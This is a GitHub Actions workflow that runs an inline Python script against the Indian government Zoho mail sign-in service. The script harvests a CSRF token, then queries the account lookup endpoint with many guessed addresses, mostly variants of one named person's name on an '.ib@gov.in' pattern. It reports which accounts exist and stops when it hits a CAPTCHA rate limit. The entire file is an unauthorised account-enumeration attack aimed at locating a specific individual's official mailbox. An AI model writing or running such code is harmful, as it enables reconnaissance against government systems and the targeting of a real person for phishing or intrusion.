name: gov-lookup
on: workflow_dispatch
jobs:
  lookup:
    runs-on: ubuntu-latest
    steps:
      - name: Run lookup
        run: |
          python3 -c "
          import urllib.request, urllib.parse, json, http.cookiejar, time

          cj = http.cookiejar.CookieJar()
          opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

          opener.open(urllib.request.Request(
              'https://accounts.mgovcloud.in/signin?servicename=ZOHOMail&serviceurl=https://mail.mgovcloud.in',
              headers={'User-Agent': 'Mozilla/5.0'}
          ))

          csrf = ''
          for c in cj:
              if 'iamcsr' in c.name:
                  csrf = c.value
                  break

          print(f'CSRF: {csrf[:20]}...')

          emails = [
              'renu.lata@gov.in',
              'zzzzfake99999@gov.in',
              'mdubey.ib@gov.in',
              'mad.ib@gov.in',
              'dubey.ib@gov.in',
              'anand.ib@gov.in',
              'manish.dubey.ib@gov.in',
              'ananddubey.ib@gov.in',
              'anand.dubey.ib@gov.in',
              'm.a.dubey.ib@gov.in',
              'dubey.manish.ib@gov.in',
              'manishad.ib@gov.in',
              'm.dubey.ib@gov.in',
              'manish.d.ib@gov.in',
              'ma.ib@gov.in',
              'md.ib@gov.in',
              'madubey.ib@gov.in',
              'dubeymanish.ib@gov.in',
              'dubey.m.ib@gov.in',
              'dubey.ma.ib@gov.in',
              'manishanand.dubey.ib@gov.in',
              'dubey.manishanand.ib@gov.in',
              'm.anand.ib@gov.in',
              'manish.a.ib@gov.in',
              'maddubey.ib@gov.in',
              'a.dubey.ib@gov.in',
              'manish1.ib@gov.in',
              'manish2.ib@gov.in',
          ]

          for email in emails:
              try:
                  data = urllib.parse.urlencode({
                      'LOGIN_ID': email,
                      'servicename': 'ZOHOMail',
                      'serviceurl': 'https://mail.mgovcloud.in'
                  }).encode()
                  req = urllib.request.Request(
                      f'https://accounts.mgovcloud.in/signin/v2/lookup/{email}',
                      data=data,
                      headers={
                          'X-ZCSRF-TOKEN': f'iamcsrcoo={csrf}',
                          'X-Requested-With': 'XMLHttpRequest',
                          'Origin': 'https://accounts.mgovcloud.in',
                          'Referer': 'https://accounts.mgovcloud.in/signin?servicename=ZOHOMail',
                          'Content-Type': 'application/x-www-form-urlencoded',
                      }
                  )
                  resp = opener.open(req)
                  body = json.loads(resp.read())
                  sc = body.get('status_code')
                  if sc == 201:
                      org = body.get('lookup',{}).get('org_name','?')
                      print(f'>> {email}: EXISTS - {org}')
                  elif 'HIP' in body.get('message',''):
                      print(f'RATE LIMITED at {email}')
                      break
              except urllib.error.HTTPError as e:
                  try:
                      body = json.loads(e.read())
                      sc = body.get('status_code')
                      if sc == 201:
                          org = body.get('lookup',{}).get('org_name','?')
                          print(f'>> {email}: EXISTS - {org}')
                      elif 'HIP' in body.get('message',''):
                          print(f'RATE LIMITED at {email}')
                          break
                  except:
                      pass
              except Exception as e:
                  print(f'{email}: ERR {str(e)[:50]}')
              time.sleep(0.3)

          print('SWEEP COMPLETE')
          "
